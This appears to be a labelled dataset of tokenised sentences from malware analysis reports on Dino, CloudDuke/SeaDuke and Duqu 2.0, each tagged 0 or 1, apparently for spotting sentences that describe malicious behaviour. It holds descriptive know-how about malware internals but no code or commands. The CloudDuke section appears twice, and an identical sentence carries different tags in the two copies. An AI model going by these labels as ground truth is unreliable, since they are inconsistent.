RamFS content is initially stored encrypted in Dino 's configuration under the key " xT0rvwz " , whereas the corresponding RC4 key is stored under the key " tr4qa589 " .	0
Once the file system has been decrypted , it is stored in memory as a linked list of 512 byte memory chunks , each one of them being individually RC4 encrypted .	0
When looking for a file in ramFS , each chunk is decrypted , processed and then re encrypted .	0
Hence there are very few noticeable traces of ramFS during its use .	0
Here are some high level characteristics of this file system .	0
Several commands can be executed in the context of ramFS , as listed in the following Table .	1
In the case of Dino , ramFS serves as protected storage for one specific file containing the instructions to remove the malware from the machine .	1
The developers named this file the " cleaner " and it is executed when Dino receives the command " killBD " ( the " BD " acronym is the developers ' designation of the malware ) .	0
Figure 2 shows the code responsible for executing this cleaner file .	0
First , it retrieves the name of the file from Dino 's configuration ( " a.ini " ) , then it retrieves the key to decrypt ramFS , and it finally mounts the file system in memory in order to execute the cleaner file stored inside .	0
The verbosity of the error messages makes it particularly easy to understand the purpose of the code .	0
The cleaner file contains the string " INSTALL A " wusvcd " U " which , once executed , will uninstall the malware from the machine – " wusvcd " being the name used to register Dino on the machine .	1
Hence , ramFS serves as a protected container for files to be executed on the machine , offering a disposable execution environment to the operators and leaving very few traces on the system .	1
The commands " cronadd " , " cronlist " and " crondel " serve respectively to add , list , and remove scheduled tasks registered in the CRONTAB module .	1
Those tasks are Dino 's commands .	0
The syntax to define scheduled tasks is similar to the one used by the cron Unix command .	0
In particular the time at which to run a command is given by a string following the format " minute hour day month year dayofweek " .	0
Alternatively , this string can be replaced by " @boot " for a command to run at each startup – whereas some Unix cron implementations accept " @reboot " .	0
As an example , here is the output of the " cronlist " command after a " wakeup " command has been scheduled to run on 7th April 2015 at 15:44 .	0
As we can see , each entry is identified by an " I d " , an incrementing hexadecimal number starting at 0xC0 .	0
The purpose of the " Local " field remains unclear ( the other possible value being " l " ) .	0
The " Count " parameter counts the number of times a command has been executed , " 1 " indicating the command will be executed only once .	0
Finally , the " Visibility " field defines whether the command execution will be reported to the C&C ( the other possible value being " Silent " ) .	0
The amount of shared code between Dino and known Animal Farm malware leaves very little doubt that Dino belongs to Animal Farm 's arsenal .	0
Among these shared features , we can cite the following .	0
At the very beginning of Dino execution , the current process name is checked against process names used by some sandboxes .	1
A very similar check ( against " klavme " , " myapp " , " TESTAPP " and " afyjevmv.exe " ) is present in Bunny samples , and in some first stage implants deployed by Animal Farm .	0
To hide its calls to certain API functions , Dino employs a classic Animal Farm ploy : a hash is calculated from the function 's name and used to look for the address of the API function .	0
The actual hashing algorithm used in Dino is the same that was used in Casper , namely a combination of rotate left ( ROL ) of 7 bits and exclusive or ( XOR ) operations .	0
The Dino 's custom file system – the so called ramFS – is present in several droppers used by Animal Farm .	0
In those binaries the file system serves to set the persistence of the payload .	0
For example , here is the command executed by some NBOT droppers in the context of ramFS .	0
As a final indication that Dino belongs to Animal Farm menagerie , it is noticeable that the output of Dino 's sysinfo command looks like an updated version of the " beacon " from the SNOWBALL implant described in the leaked CSE slides – part of operation SNOWGLOBE , which led to the discovery of Babar .	0
Dino 's sysinfo example output Login / Domain ( owner ) : Administrator / JOHN ( john ) Computer name : JOHN Organization ( country ) .	0
( United States ) RecId : 11173 01 PRS MaxDelay : 3600 Version : 1.2 OS version ( SP ) : 5.1 ( Service Pack 3 ) WOW64 : No Default browser : firefox.exe IE version : Mozilla/4.0 ( compatible; MSIE 7.0; Win32 ) First launch : 04/01/2015 – 18:31:14 Time to kill : N / A Last launch : 04/01/2015 – 19:21:44 Mode : N / A | Rights : Admin | UAC : No ID : 4635BEF0 D89D 11E4 B283 000C 29FD2872 InstallAv : 0 Inj : Yes SNOWBALL implant beacon All these indicators together make us very confident that Dino was developed by the Animal Farm group .	0
Dino adds at least two more indicators to those already documented suggesting that Animal Farm developers are French speaking .	0
Dino 's binary contains a resource whose language code value is 1036 .	0
The original purpose of this language code is to allow developers to provide resources ( menus , icons , version information … ) for different locations in the world in the corresponding language .	0
Interestingly , when a developer does not manually specify the language code , the compiler sets it to the language of the developer 's machine .	0
So , which language corresponds to the value 1036 , or 0x40c in hexadecimal ? French ( France ) .	0
Of course a non French speaking developer could have deliberately set this value to mislead attribution efforts .	0
But in more recent Animal Farm binaries ( for example Casper ) , this language code has been set to the classical English ( USA ) language code .	0
Therefore , it seems that Animal Farm developers forgot to set this value in their first creations , realized their mistake at some point , and decided to set a standard value .	0
Someone using the language code as a false flag would have likely kept the strategy going .	0
For the record , this Dino sample is not the only Animal Farm binary with 1036 as language code .	0
Dino 's binary is statically linked with the GnuMP library , which is used to manipulate big numbers in cryptography algorithms .	0
The GnuMP code in Dino contains file paths coming from the developer 's machine .	0
As the attentive reader has probably guessed , " arithmetique " is the French translation of " arithmetic " .	0
Dino 's binary shows an intense development effort , from custom data structures to a homemade file system .	0
As with other Animal Farm binaries , it bears the mark of professional and experienced developers .	0
But Dino also shows a poor knowledge , or interest , from these developers in anti analysis techniques – contrary to what was seen in Casper – as demonstrated , for example , by the verbosity of some Dino 's log messages .	0
All those messages provide substantial help in understanding Dino 's internal workings .	0
One will also appreciate the numerous misspellings contained in the messages .	0
Regarding Dino 's victims , we know very little except that they were located in Iran in 2013 .	0
This is in accordance with the victimology described by Canada 's CSE in its presentation .	0
That leads us to the final point of this blog : several signs suggest that Dino 's creators are French speaking developers .	0
These signs add to the pretty long list of indicators already supporting this hypothesis , in particular the ones mentioned by Canada 's CSE .	0
Author Joan Calvet , ESET	0
Recent weeks have seen the outing of two new additions to the Duke group 's toolset , SeaDuke and CloudDuke .	0
Of these , SeaDuke is a simple trojan made interesting by the fact that it 's written in Python .	0
And even more curiously , SeaDuke , with its built - in support for both Windows and Linux , is the first cross - platform malware we have observed from the Duke group .	0
While SeaDuke is a single - albeit cross- platform - trojan , CloudDuke appears to be an entire toolset of malware components , or " solutions " as the Duke group apparently calls them .	0
These components include a unique loader , downloader , and not one but two different trojan components .	0
CloudDuke also greatly expands on the Duke group 's usage of cloud storage services , specifically Microsoft 's OneDrive , as a channel for both command and control as well as the exfiltration of stolen data .	0
Finally , some of the recent CloudDuke spear - phishing campaigns have born a striking resemblance to CozyDuke spear - phishing campaigns from a year ago .	0
Last week , both Symantec and Palo Alto Networks published research on SeaDuke , a newer addition to the arsenal of trojans being used by the Duke group .	0
While older malware by the Duke group has always been written with a combination of the C and C++ programming languages as well as assembly language , SeaDuke is peculiarly written in Python with multiple layers of obfuscation .	0
This Python code is usually then compiled into Windows executables using py2exe or pyinstaller .	0
However , the Python code itself has been designed to work on both Windows and Linux .	0
We therefore suspect , that the Duke group is also using the same SeaDuke Python code to target Linux victims .	0
This is the first time we have seen the Duke group employ malware to target Linux platforms .	0
Last week , we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components they respectively called MiniDionis and CloudLook .	0
MiniDionis and CloudLook are both components of a larger malware toolset we call CloudDuke .	0
This toolset consists of malware components that provide varying functionality while partially relying on a shared code framework and always using the same loader .	0
Based on PDB strings found in the samples , the malware authors refer to the CloudDuke components as " solutions " with names such as " DropperSolution " , " BastionSolution " and " OneDriveSolution " .	0
A list of PDB strings we have observed is below .	0
The first of the CloudDuke components we have observed is a downloader internally called " DropperSolution " .	0
The purpose of the downloader is to download and execute additional malware on the victim 's system .	1
In most observed cases , the downloader will attempt to connect to a compromised website to download an encrypted malicious payload which the downloader will decrypt and execute .	1
Depending on the way the downloader has been configured , in some cases it may first attempt to log in to Microsoft 's cloud storage service OneDrive and retrieve the payload from there .	0
If no payload is available from OneDrive , the downloader will revert to the previously mentioned method of downloading from compromised websites .	0
We have also observed two distinct trojan components in the CloudDuke toolset .	0
The first of these , internally called " BastionSolution " , is the trojan that Palo Alto Networks described in their research into " MiniDionis " .	0
Interestingly , BastionSolution appears to functionally be an exact copy of SeaDuke with the only real difference being the choice of programming language .	0
BastionSolution also makes significant use of a code framework that is apparently internally called " Z " .	0
This framework provides classes for functionality such as encryption , compression , randomization and network communications .	0
Classes from the same " Z " framework , such as the encryption and randomization classes , are also used by the second trojan component of the CloudDuke toolset .	0
This second component , internally called " OneDriveSolution " , is especially interesting because it relies on Microsoft 's cloud storage service OneDrive as its command and control channel .	1
To achieve this , OneDriveSolution will attempt to log into OneDrive with a preconfigured username and password .	0
If successful , OneDriveSolution will then proceed to copy data from the victim 's computer to the OneDrive account .	1
It will also search the OneDrive account for files containing commands for the malware to execute .	1
All of the CloudDuke " solutions " use the same loader , a piece of code whose primary purpose is to decrypt the embedded , encrypted solution , load it in memory and execute it .	1
The Duke group has often employed loaders for their malware but unlike the previous loaders they have used , the CloudDuke loader is much more versatile with support for multiple methods of loading and executing the final payload as well as the ability to write to disk and execute additional malware components .	0
CloudDuke spear - phishing campaigns and similarities with CozyDuke CloudDuke has recently been spread via spear - phishing emails with targets reportedly including organizations such as the US Department of Defense .	0
These spear - phising emails have contained links to compromised websites hosting zip archives that contain CloudDuke - laden executables .	0
In most cases , executing these executables will have resulted in two additional files being written to the victim 's hard disk .	1
The first of these files has been a decoy , such as an audio file or a PDF file while the second one has been a CloudDuke loader embedding a CloudDuke downloader , the so - called " DropperSolution " .	0
In these cases , the victim has been presented with the decoy file while in the background the downloader has proceeded to download and execute one of the CloudDuke trojans , " OneDriveSolution " or " BastionSolution " .	0
Interestingly , however , some of the other CloudDuke spear - phishing campaigns we have observed this July have born a striking resemblance to CozyDuke spear - phishing campaigns seen almost exactly a year ago , in the beginning of July 2014 .	0
In both spear - phishing campaigns , the decoy document has been the exact same PDF file , a " US letter fax test page " ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b ) .	0
Similarly , the URLs hosting the malicious files have , in both campaigns , purported to be related to eFaxes .	0
It is also interesting to note , that in the case of the CozyDuke - inspired CloudDuke spear - phishing campaign , the downloading and execution of the malicious archive linked to in the emails has not resulted in the execution of the CloudDuke downloader but in the execution of the " BastionSolution " component thereby skipping one step from the process described for the other CloudDuke spear - phishing campaigns .	0
Developing even a single multipurpose malware toolset , never mind many , requires time and resources .	0
Therefore it seems logical to attempt to reuse code such as supporting frameworks between different toolsets .	0
The Duke group , however , appear to have taken this a step further with SeaDuke and the CloudDuke component BastionSolution , by rewriting the same code in multiple programming languages .	0
This has the obvious benefits of saving time and resources by providing two malware toolsets , that while similar on the inside , appear completely different on the outside .	0
This way , the discovery of one toolset does not immediately lead to the discovery of the second toolset .	0
The Duke group , long suspected of ties to the Russian state , have been running their espionage operation for an unusually long time and - especially lately - with unusual brazenness .	0
These latest CloudDuke and SeaDuke campaigns appear to be a clear sign that the Duke 's are not planning to stop any time soon .	0
Research and post by Artturi ( @lehtior2 ) F - Secure detects CloudDuke as Trojan : W32/CloudDuke . B and Trojan : W64/CloudDuke . B Samples .	0
Compromised servers used for command and control .	0
Compromised websites used to host CloudDuke .	0
Recent weeks have seen the outing of two new additions to the Duke group 's toolset , SeaDuke and CloudDuke .	0
Of these , SeaDuke is a simple trojan made interesting by the fact that it 's written in Python .	0
And even more curiously , SeaDuke , with its built - in support for both Windows and Linux , is the first cross - platform malware we have observed from the Duke group .	0
While SeaDuke is a single - albeit cross- platform - trojan , CloudDuke appears to be an entire toolset of malware components , or " solutions " as the Duke group apparently calls them .	0
These components include a unique loader , downloader , and not one but two different trojan components .	0
CloudDuke also greatly expands on the Duke group 's usage of cloud storage services , specifically Microsoft 's OneDrive , as a channel for both command and control as well as the exfiltration of stolen data .	0
Finally , some of the recent CloudDuke spear - phishing campaigns have born a striking resemblance to CozyDuke spear - phishing campaigns from a year ago .	0
Last week , both Symantec and Palo Alto Networks published research on SeaDuke , a newer addition to the arsenal of trojans being used by the Duke group .	0
While older malware by the Duke group has always been written with a combination of the C and C++ programming languages as well as assembly language , SeaDuke is peculiarly written in Python with multiple layers of obfuscation .	0
This Python code is usually then compiled into Windows executables using py2exe or pyinstaller .	0
However , the Python code itself has been designed to work on both Windows and Linux .	0
We therefore suspect , that the Duke group is also using the same SeaDuke Python code to target Linux victims .	0
This is the first time we have seen the Duke group employ malware to target Linux platforms .	0
Last week , we also saw Palo Alto Networks and Kaspersky Labs publish research on malware components they respectively called MiniDionis and CloudLook .	0
MiniDionis and CloudLook are both components of a larger malware toolset we call CloudDuke .	0
This toolset consists of malware components that provide varying functionality while partially relying on a shared code framework and always using the same loader .	0
Based on PDB strings found in the samples , the malware authors refer to the CloudDuke components as " solutions " with names such as " DropperSolution " , " BastionSolution " and " OneDriveSolution " .	0
A list of PDB strings we have observed is below .	0
The first of the CloudDuke components we have observed is a downloader internally called " DropperSolution " .	0
The purpose of the downloader is to download and execute additional malware on the victim 's system .	1
In most observed cases , the downloader will attempt to connect to a compromised website to download an encrypted malicious payload which the downloader will decrypt and execute .	1
Depending on the way the downloader has been configured , in some cases it may first attempt to log in to Microsoft 's cloud storage service OneDrive and retrieve the payload from there .	0
If no payload is available from OneDrive , the downloader will revert to the previously mentioned method of downloading from compromised websites .	0
We have also observed two distinct trojan components in the CloudDuke toolset .	0
The first of these , internally called " BastionSolution " , is the trojan that Palo Alto Networks described in their research into " MiniDionis " .	0
Interestingly , BastionSolution appears to functionally be an exact copy of SeaDuke with the only real difference being the choice of programming language .	0
BastionSolution also makes significant use of a code framework that is apparently internally called " Z " .	0
This framework provides classes for functionality such as encryption , compression , randomization and network communications .	0
Classes from the same " Z " framework , such as the encryption and randomization classes , are also used by the second trojan component of the CloudDuke toolset .	0
This second component , internally called " OneDriveSolution " , is especially interesting because it relies on Microsoft 's cloud storage service OneDrive as its command and control channel .	0
To achieve this , OneDriveSolution will attempt to log into OneDrive with a preconfigured username and password .	0
If successful , OneDriveSolution will then proceed to copy data from the victim 's computer to the OneDrive account .	1
It will also search the OneDrive account for files containing commands for the malware to execute .	1
All of the CloudDuke " solutions " use the same loader , a piece of code whose primary purpose is to decrypt the embedded , encrypted solution , load it in memory and execute it .	1
The Duke group has often employed loaders for their malware but unlike the previous loaders they have used , the CloudDuke loader is much more versatile with support for multiple methods of loading and executing the final payload as well as the ability to write to disk and execute additional malware components .	0
CloudDuke has recently been spread via spear - phishing emails with targets reportedly including organizations such as the US Department of Defense .	0
These spear - phising emails have contained links to compromised websites hosting zip archives that contain CloudDuke - laden executables .	0
In most cases , executing these executables will have resulted in two additional files being written to the victim 's hard disk .	1
The first of these files has been a decoy , such as an audio file or a PDF file while the second one has been a CloudDuke loader embedding a CloudDuke downloader , the so - called " DropperSolution " .	0
In these cases , the victim has been presented with the decoy file while in the background the downloader has proceeded to download and execute one of the CloudDuke trojans , " OneDriveSolution " or " BastionSolution " .	0
Interestingly , however , some of the other CloudDuke spear - phishing campaigns we have observed this July have born a striking resemblance to CozyDuke spear - phishing campaigns seen almost exactly a year ago , in the beginning of July 2014 .	0
In both spear - phishing campaigns , the decoy document has been the exact same PDF file , a " US letter fax test page " ( 28d29c702fdf3c16f27b33f3e32687dd82185e8b ) .	0
Similarly , the URLs hosting the malicious files have , in both campaigns , purported to be related to eFaxes .	0
It is also interesting to note , that in the case of the CozyDuke - inspired CloudDuke spear - phishing campaign , the downloading and execution of the malicious archive linked to in the emails has not resulted in the execution of the CloudDuke downloader but in the execution of the " BastionSolution " component thereby skipping one step from the process described for the other CloudDuke spear - phishing campaigns .	0
CloudDuke is not the first time we have observed the Duke group use cloud services in general and Microsoft OneDrive specifically as part of their operations .	0
Earlier this spring we released research on CozyDuke where we mentioned observing CozyDuke sometimes either directly use a OneDrive account to exfiltrate stolen data or alternatively CozyDuke downloading Visual Basic scripts that would copy stolen files to a OneDrive account and sometimes even retrieve files containing additional commands from the same OneDrive account .	0
In these previous cases the Duke group has only used OneDrive as a secondary communication channel but still relied on more traditional C&C channels for most of their actions .	0
It is therefore interesting to note that CloudDuke actually enables the Duke group to rely solely on OneDrive for every step of their operation from downloading the actual trojan , passing commands to the trojan and finally exfiltrating stolen data .	0
By relying solely on 3rd party web services , such as OneDrive , as their command and control channel , we believe the Duke group is trying to better evade detection .	0
Large amounts of data being transferred from an organization 's network to an unknown web server easily raises suspicions .	0
However , data being transferred to a popular cloud storage service is normal .	0
What better way for an attacker to surreptitiously transfer large amounts of stolen data than the same way people are transferring that same data every day for legitimate reasons .	0
( Coincidentally , the implications of 3rd party web services being used as command and control channels is also the subject of an upcoming talk at the VirusBulletin 2015 conference ) .	0
Developing even a single multipurpose malware toolset , never mind many , requires time and resources .	0
Therefore it seems logical to attempt to reuse code such as supporting frameworks between different toolsets .	0
The Duke group , however , appear to have taken this a step further with SeaDuke and the CloudDuke component BastionSolution , by rewriting the same code in multiple programming languages .	0
This has the obvious benefits of saving time and resources by providing two malware toolsets , that while similar on the inside , appear completely different on the outside .	0
This way , the discovery of one toolset does not immediately lead to the discovery of the second toolset .	0
The Duke group , long suspected of ties to the Russian state , have been running their espionage operation for an unusually long time and - especially lately - with unusual brazenness .	0
These latest CloudDuke and SeaDuke campaigns appear to be a clear sign that the Duke 's are not planning to stop any time soon .	0
Research and post by Artturi ( @lehtior2 ) F - Secure detects CloudDuke as Trojan : W32/CloudDuke . B and Trojan : W64/CloudDuke . B Samples .	0
Compromised servers used for command and control .	0
Compromised websites used to host CloudDuke .	0
In October 2011 , we analyzed a new threat what we named Duqu , and we showed that it has close relationships to the infamous Stuxnet attack .	0
By courtesy of Kaspersky Lab , in late May 2015 we received samples about a new threat , with the hint that it might be related to the Duqu attacks ; however , these new samples are from 2014 .	0
We decided to carry out an individual research on the samples with the focus on the connections between the original Duqu attack and the new threat , dubbed " Duqu 2.0 " .	0
After analyzing the samples received , we think , that the adversaries behind Duqu malware are back and active ; while they modified their tools to be undetected by old methods , they also strongly reused codes and ideas during their recent attacks .	0
The numerous similarities that we discovered between Duqu and Duqu 2.0 include the following .	0
In this report , we present supporting details and analysis for all the similarities listed above .	0
Stuxnet is probably the most well - known malware of our times .	0
Its fame stems from the facts that it targeted a very specific industrial facility , namely a uranium enrichment plant in Iran , it aimed at physical destruction of uranium centrifuges , and it apparently accomplished its mission successfully .	0
In addition to all these characteristics , IT security experts also appreciate its technical sophistication and the zero - day exploits that it used .	0
Stuxnet was also an alarm to the developed world : it shed light on the capabilities of advanced attackers , and at the same time , on the numerous weaknesses of our computing infrastructure .	0
Putting these two together , people started to feel hopelessly vulnerable .	0
Yet , unfortunately , Stuxnet is not a unique example for a highly sophisticated targeted threat , but there are numerous other pieces of malware of similar kind , including Duqu , Flame , Regin , etc .	0
Among those , Duqu is particularly interesting , not only because we discovered it back in 2011 , but because our analysis pointed out that - while Duqu 's objective is different - it has very strong similarities to Stuxnet in terms of architecture , code , and methods to achieve stealthiness .	0
Today , it is widely believed within the IT security community that Duqu was created by the same attackers who created Stuxnet .	0
And now we have a new member of the same family ! Last month , we received interesting samples from Kaspersky Lab with a hint that they might be related to the Duqu samples of 2011 ; however , these new samples are from 2014 .	0
Our common understanding was that it would be interesting to figure out whether this new threat is indeed related to the old Duqu attack , and we in the CrySyS Lab should try to focus our analysis efforts on answering this question .	0
It is important to emphasize that we did our analysis independently from Kaspersky Lab : we did not read their preliminary report and they did not share any of their findings with us ( apart from the samples that we received from them ) .	0
The analysis results performed by Kaspersky Lab can be read in the following report .	0
https://securelist.com / blog / research/70504/the - mystery - of - duqu- 2 - 0-a - sophisticated - cyberespionage - actor - returns/ In this report , we present the results of our comparative analysis of the old version of Duqu and the new version , codenamed " Duqu 2.0 " .	0
We concentrate on the description of the relevant similarities and differences we have found between the two malware samples .	0
In the table below , one can see the MD5 fingerprints of the two samples we have examined during our initial analysis .	0
The first module will be referenced in this document with the name " c7c647 " , and the second with the name " 3f52ea " according to the prefix of their MD5 hashes .	0
In the following chapter , we will discuss the most conspicuous similarities and differences we have found between the main modules of Duqu and Duqu 2.0 .	0
Both the two main modules of Duqu 2.0 we have analyzed ( " c7c647 " and " 3f52ea " ) has 6 export functions which can be seen in the following figure .	0
The new sample ( both versions ) is one big executable file that is linked by multiple modules .	0
The original Duqu had a main module that was divided into two sub - modules : an outside layer and an internal part .	0
In one version , the internal part was stored in a specific compressed format , while in another version , which we investigated at a Duqu victim , it was stored in cleartext in a resource data section of the main executable .	0
The Duqu 2.0 version we investigated is different : everything is incorporated in the main executable , but there are still visible marks showing that the malware is linked / compiled from multiple different parts , modules .	0
Some of the strings in Duqu 2.0 are obfuscated by XOR - based encryption .	1
The actual routine used is printed below .	0
The decompiled version of the above assembly code can be seen in the following sample .	0
The above string decryptor routine is a simple XOR decoder .	0
It simply XORs consecutive 4-byte blocks of the encrypted string buffer , given by its pointer in the first parameter of the function , with a fixed 4-byte key ( " 0x86F186F1 " ) .	0
After the decryption of all consecutive 4- byte blocks , the actual cleartext block is stored within the next 4 bytes of the output buffer , pointed by parameter " a2 " .	0
The decrypted ( cleartext ) string is terminated with a " \0 " character , and if the decryptor cycle reaches the end of the ( cleartext ) string , the cleartext string will be pointed by the address stored in output argument " a2 " .	0
A closer look at the above C code reveals that the string decryptor routine actually has two parameters : " encrstr " and " a2 " .	0
First , the decryptor function checks if the input buffer ( the pointer of the encrypted string ) points to a valid memory area ( i.e. , it does not contain NULL value ) .	0
After that , the first 4 bytes of the encrypted string buffer is XORed with the key " 0x86F186F1 " and the result of the XOR operation is stored in variable " result " .	0
The first DWORD ( first 4 bytes ) of the output buffer a2 is then populated by this resulting value ( * ( _ DWORD * ) a2 = result ; ) .	0
Therefore , the first 4 bytes of the output buffer will contain the first 4 bytes of the cleartext string .	0
If the first two bytes ( first WORD ) of the current value stored in variable " result " contain ' \0 ' characters , the original cleartext string was an empty string and the resulting output buffer will be populated by a zero value , stored on 2 bytes .	0
If the first half of the actual decrypted block ( " result " variable ) contains something else , the decryptor routine checks the second half of the block ( " if ( ! * ( _ WORD * ) ( a2 + 2 ) ) ") .	0
If this WORD value is NULL , then decryption will be ended and the output buffer will contain only one Unicode character with two closing ' \0 ' bytes .	0
If the first decrypted block doens't contain zero character ( generally this is the case ) , then the decryption cycle continues with the next 4-byte encrypted block .	0
The pointer of the output buffer is incremeted by 4 bytes to be able to store the next cleartext block ( " a2 + = 4 ; " ) .	0
After that , the following 4-byte block of the " ciphertext " will be decrypted with the fixed decryption key ( " 0x86F186F1 " ) .	0
The result is then stored within the next 4 bytes of the output buffer .	0
Now , the output buffer contains 2 blocks of the cleartext string .	0
The condition of the cycle checks if the decryption reached its end by checking the first half of the current decrypted block .	0
If it did not reached the end , then the cycle continues with the decryption of the next input blocks , as described above .	0
Before the decryption of each 4-byte " ciphertext " block , the routine also checks the second half of the previous cleartext block to decide whether the decoded string is ended or not .	0
The original Duqu used a very similar string decryption routine , which we printed in the following figure below .	0
We can see that this routine is an exact copy of the previously discussed routine ( variable " a1 " is analogous to " encrstr " argument ) .	0
The only difference between the Duqu 2.0 and Duqu string decryptor routines is that the XOR keys differ ( in Duqu , the key is"0xB31FB31F " ) .	0
We can also see that the decompiled code of Duqu contains the decryptor routine in a more compact manner ( within a " for " loop instead of a " while " ) , but the two routines are essentially the same .	0
For example , the two boundary checks in the Duqu 2.0 routine ( " if ( ! * ( _ WORD * ) ( a2 + 2 ) ) " and " while ( ( _ WORD)result ) ; " ) are analogous to the boundary check at the end of the " for " loop in the Duqu routine ( " if ( ! ( _ WORD)v4 || ! * ( _ WORD * ) ( result + 2 ) ) ") .	0
Similarly , the increment operation within the head of the for loop in the Duqu sample ( " result + = 4 " ) is analogous to the increment operation " a2 + = 4 ; " in the Duqu 2.0 sample .	0
The analyzed main module of Duqu 2.0 and also the old Duqu sample reads configuration information from a special file .	1
This configuration file is encrypted using the AES block cipher in CBC mode with a CTS - like ( Ciphertext Stealing ) encryption of the last two cleartext blocks .	0
The format of the configuration file will be discussed in details in the next chapter .	0
Before the encryption of the configuration file , an AES wrapper object is created .	0
This C++ object represents the context ( parameters ) of the encryption .	0
Therefore , it also stores the initialization vector ( IV ) of the encryption , the key of the cipher and the data to be encrypted .	0
The structure of this object 's class can be seen in the upper part of the next screenshot .	0
As we can see , the allocated memory area of an instance of the " aeswrapper " structure ( class ) starts with a 16 bytes ( 128 bits ) IV value ( of course , the size of the IV equals the size of an AES input block ) .	0
It is followed by a 516-byte buffer ( or other unused smaller attributes ) which can store the encryption key of the AES cipher .	0
Size of this encryption key can be either 128 , 192 or 256 bits ( 16 , 24 or 32 bytes ) .	0
The last 4 bytes of the " aeswrapper " structure contains the pointer to the data to be encrypted .	0
In addition to the attributes ( IV , encryption key , pointer to a data buffer ) , the " aeswrapper " class also contains methods .	0
The most important methods are the " encrypt " and " initialize " functions .	0
As the name shows , the initialize method initializes the context ( parameters ) of the encryption , therefore it sets the IV , key and data members of the " aeswrapper " object .	0
The IV is generated by " hand " , but the key is prepared from an initial key using the prepare_key function .	0
The encrypt method encrypts the data in the modified CBC - CTS- like mode .	0
The method uses an AES encryptor function .	0
The nth_block method of the class gives back a pointer to the n - th block of the data to be encrypted .	0
Finally , the " aeswrapper " class uses the last_block function to perform the CTS - like encryption mechanism at the end .	0
The function gives back a pointer not to the last partial ( smaller than 16 bytes ) input block , but to the last 16 bytes of the input data buffer .	0
The implementation of AES prepare_key and encrypt methods are presumably copied from function libraries .	0
The figure above shows the structures ( structures of class instances ) which we identified and which are related to the encryption routine and the AES initialization , and the putative attributes of these structures ( classes ) .	0
Using these structures , the disassembled code can be more readable .	0
There is another structure in addition to the " aeswrapper " class called " aes " on the screenshot above .	0
An instance of this class represents an AES encryptor object .	0
It has probably 3 attributes : key_schedule , precomputed and iteration_count .	0
In the following table , we can see the AES initialization routine ( of the configuration file encryption ) of the old Duqu ( on the left ) and the new Duqu 2.0 sample ( on the right ) at assembly code level .	0
The decompiled code of the initialization function ( for both malware samples ) can be seen in figure Sample 6 .	0
The AES initialization function initializes the mentioned " aeswrapper " object , it sets the data buffer , prepares the encryption key , and finally , generates the IV based on the magic constant .	0
Duqu " netp " routine Duqu 2.0 " c7c64 " routine In both cases , the highlighted part of the assembly code corresponds to the highlighted part of the initialization routines in the decompiled versions of the code , which can be seen in figure Sample 6 .	0
The only difference between the highlighted parts is the values of the magic constants ( " 0xDEADBABE " vs.	0
" 0x248561EF " ) which are used for the generation of the 128-bit initialization vectors .	0
The mentioned AES initialization routines ( and also the common encryption function ) will be discussed later in this section in more details .	0
We also reverse engineered the encryption routine used by Duqu 2.0 , which is illustrated in the following block diagram .	0
With the exception of the last two input blocks , consecutive blocks of the cleartext data are encrypted with the AES encryption algorithm in CBC mode .	0
Accordingly , the first block of the input data ( " P[0 ] " ) is XORed with a fixed initialization vector ( named as " Fixed IV " in the figure above ) .	0
This 128-bit initialization vector ( IV ) differs between the old Duqu and the new Duqu 2.0 samples .	0
The value of this IV is generated from a magic constant , as it can be seen in the highlighted parts of the previous assembly code .	0
As this magic constant is different in the old and new samples , the generated IV will also be different .	0
The result of the previously mentioned XOR operation gives the first input block of the AES encryption algorithm ( " AES-256 " is in use ) .	0
The number 256 means that the AES algorithm has 256-bit key size .	0
The block size of the AES cipher is constant 128 bits ( 16 bytes ) .	0
" E[0 ] " is the first output of the block cipher , so it will be the first encrypted block ( " F[0 ] " ) .	0
Output of the block cipher ( " E[0 ] " ) is then XORed with the second input block ( " P[1 ] " ) , and the resulting block will be encrypted with AES-256 .	0
This procedure continues until the encryption of the last but first block of the cleartext data .	0
If the size of the input data is an integer multiple of the block size of AES ( i.e. , 128 bits ) , then the remaining last two blocks of the cleartext are encrypted in the same manner as the previous input blocks .	0
So , in this case , the whole encryption routine matches a simple CBC mode encryption .	0
However , if the size of the input data is not an exact multiple of the AES block size , the last partial block of the input data needs padding to be completed to a full block .	0
In case of Duqu 2.0 , the developers of the malware did n't use padding in a traditional way .	0
Instead , they use a CTS - like ( Ciphertext Stealing ) method .	0
The essence of the method used by the encryption routine is that a part of the last but first block of the input data is encrypted twice using AES .	0
The last but first block ( " P[n-1 ] " ) of the cleartext data is XORed with the previous ciphertext block ( " E[n-2 ] " ) and encrypted with AES-256 as previously .	0
The result of this operation is the " E[n-1 ] " output block .	0
The " E[n-1 ] " output block wo n't be directly used as the ( n-1)st ciphertext block .	0
Instead , the output " E[n-1 ] " is splitted into two distinct parts : " F[n-1 ] " and another part which is then fed into the AES encryptor again .	0
The last cleartext partial block ( " P[n ] " ) – which has size less than 16 bytes – is completed from its beginning to get a full AES input block .	0
The data used for completing the last partial block is taken from the end of the previous AES output block ( " E[n-1 ] " ) .	0
The resulting block will be fed into the AES-256 cipher in the last step of the encryption process .	0
The output of the last invocation of the AES cipher will be the last ciphertext block ( " F[n ] " ) .	0
The output of the last but first invocation of the AES encryptor ( " E[n-1 ] " ) is split into two parts , and the first part of size size_of_the_last_cleartext_block will be the ( n-1)st ciphertext block ( " F[n- 1 ] " ) .	0
The old Duqu samples used exactly the same encryption method .	0
The decompiled code of the AES encryptor of Duqu can be seen in the following sample , and one can see that this code implements the method we have just explained and illustrated in the block diagram of Figure 8 .	0
The next table compares the AES initialization routines of the old Duqu sample ( upper part of the table ) and the main module of Duqu 2.0 ( lower part of the table ) .	0
First , the initialization routine copies the pointer of the input data buffer into the " data " member of the " aeswrapper " object .	0
The routine takes this pointer as its second parameter .	0
The first parameter is the pointer ( reference ) of the object instance , since in C++ , the first ( hidden ) parameter of a ( non - static ) class method is always the pointer of the object , or in other words , the " this " pointer .	0
In case of Duqu 2.0 , the routine has a third parameter , the pointer to the buffer containing the key .	0
After that , the content of the " key " buffer ( which is a global buffer in the first case ) is copied into the local " key _ " buffer in both cases .	0
Then the prepare_key method of the AES object prepares the final encryption key based on this key , and feeds it into the " aeswrapper " object .	0
Invocation of the prepare_key method can also be seen in the assembly view ( see Sample 4 . ) , the method is referred by the name AES1_sub_2F9B1 in case of Duqu and AES_1_sub_1001690A in case of Duqu 2.0 .	0
In the Duqu 2.0 case , the function has one more parameter , as this can also be seen in the assembly view , and the length of the AES key is chosen as 256 bits .	0
Finally , the remaining part of the code initializes the IV member of " aeswrapper " object .	0
